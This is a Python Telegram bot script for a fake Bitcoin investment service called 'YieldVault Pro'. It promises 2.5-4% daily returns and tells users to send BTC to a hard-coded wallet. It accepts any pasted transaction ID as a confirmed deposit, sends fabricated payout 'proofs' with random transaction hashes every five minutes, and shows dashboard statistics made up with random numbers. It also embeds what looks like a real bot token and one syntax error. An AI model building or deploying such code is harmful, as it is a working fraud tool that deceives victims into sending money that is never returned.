import telebot
from telebot import types
import time
import threading
import random
import string

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

BTC_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📈 PAKETI
PACKAGES = {
    "Basic": {"min": 0.001, "daily": 2.5, "duration": 30},
    "Standard": {"min": 0.005, "daily": 3.0, "duration": 45},
    "Premium": {"min": 0.01, "daily": 3.5, "duration": 60},
    "VIP": {"min": 0.05, "daily": 4.0, "duration": 90}
}

# 🎯 GLOBALNI BROJAČI
TOTAL_PAID = round(random.uniform(12.5, 18.3), 4)
DAILY_PAYOUTS = random.randint(80, 150)

# 🧠 Generiši TXID
def generate_txid():
    return ''.join(random.choices(string.hexdigits.lower(), k=64))

# 🧾 Dokaz isplate
def generate_proof(amount_btc):
    global DAILY_PAYOUTS
    DAILY_PAYOUTS += 1
    return f'''✅ CONFIRMED PAYOUT
User ID: {random.randint(100000, 999999)}
Amount: {round(amount_btc, 6)} BTC
Wallet: {BTC_WALLET[:12]}...{BTC_WALLET[-8:]}
TXID: `{generate_txid()}`
Time: {time.strftime("%Y-%m-%d %H:%M")}
Status: 6/6 Confirmations
Network: Bitcoin Mainnet'''

# 📊 Dashboard
def get_dashboard():
    return f'''📊 *YieldVault Pro Dashboard*

👥 Total Users: {random.randint(12000, 18000)}
🟢 Active Stakers: {random.randint(2300, 3500)}
💰 Total Paid Out: {TOTAL_PAID + random.uniform(0.1, 0.5):.4f} BTC
⚡ 24h Payouts: {DAILY_PAYOUTS}
📅 Uptime: 99.98%

🔗 Official Wallet: `{BTC_WALLET}`
'''

# 🚀 Start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
    markup = types.InlineKeyboardMarkup()
    deposit = types.InlineKeyboardButton("📥 Start Earning", callback_data='deposit')
    packages = types.InlineKeyboardButton("📦 Investment Plans", callback_data='packages')
    dashboard = types.InlineKeyboardButton("📊 Live Dashboard", callback_data='dashboard')
    support = types.InlineKeyboardButton("🆘 Live Support", callback_data='support')
    markup.add(deposit)
    markup.add(packages)
    markup.add(dashboard)
    markup.add(support)
    bot.reply_to(message, f'''🚀 *Welcome to YieldVault Pro*

The most trusted **automated BTC yield platform** on Telegram.  
✅ 2.5% - 4.0% daily returns  
✅ Instant payouts  
✅ 24/7 support via `@Maranatha1337`  
✅ Referral rewards up to 15%

🔐 All payouts are sent directly to your wallet:  
`{BTC_WALLET}`

Click below to start earning.''', reply_markup=markup, parse_mode='Markdown')

# 🔘 Callback handler
@bot.callback_handler(func=lambda call: True)
def handle(call):
    if call.data == 'deposit':
        bot.send_message(call.message.chat.id, f'''📌 To start earning, send BTC to:

`{BTC_WALLET}`

Minimum:
• Basic: 0.001 BTC
• VIP: 0.05 BTC

After payment, send TXID with command:
`/hash TXID_HERE`

You'll receive your first payout in 5 minutes.''', parse_mode='Markdown')
    elif call.data == 'packages':
        pkg_msg = "*Available Investment Plans:*\n\n"
        for name, data in PACKAGES.items():
            pkg_msg += f"🔥 *{name}*\n"
            pkg_msg += f"• Min: {data['min']} BTC\n"
            pkg_msg += f"• Daily: {data['daily']}%\n"
            pkg_msg += f"• Duration: {data['duration']} days\n\n"
        pkg_msg += "💎 Higher packages = higher returns + priority support."
        bot.send_message(call.message.chat.id, pkg_msg, parse_mode='Markdown')
    elif call.data == 'dashboard':
        bot.send_message(call.message.chat.id, get_dashboard(), parse_mode='Markdown')
    elif call.data == 'support':
        bot.send_message(call.message.chat.id, '''🛠 *Live Support*

Need help? Contact:  
👉 `@Maranatha1337`

⚠️ Never share your private keys.  
Your payouts are fully automated and secure.''', parse_mode='Markdown')

# 🧾 Hash command
@bot.message_handler(commands=['hash'])
def hash_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send your TXID:\n`/hash abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.choice([0.0015, 0.003, 0.007, 0.015, 0.05]), 4)
    global TOTAL_PAID
    TOTAL_PAID += amount * 0.03

    bot.reply_to(message, f'''✅ Deposit confirmed!
Transaction: `{txid}`
Amount: {amount} BTC
Status: Processing...

Your first payout will arrive in 5 minutes.

💡 You are now earning {random.choice([2.5, 3.0, 3.5, 4.0)}% daily.''', parse_mode='Markdown')

    def auto_payout():
        for i in range(50):
            time.sleep(300)  # 5 min
            daily_rate = random.uniform(0.025, 0.04)
            earned = round(amount * daily_rate, 6)
            proof = generate_proof(earned)
            try:
                bot.send_message(message.chat.id, f'''🎉 DAILY YIELD RECEIVED

{proof}

🔁 Next payout in 5 minutes.

🚀 Invite friends & earn 10%:
`https://t.me/VoidYieldBot?start={message.chat.id}`''')
            except:
                break

    threading.Thread(target=auto_payout).start()

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ YieldVault Pro is live. All systems active.")

def poll():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=poll)
    t.start()
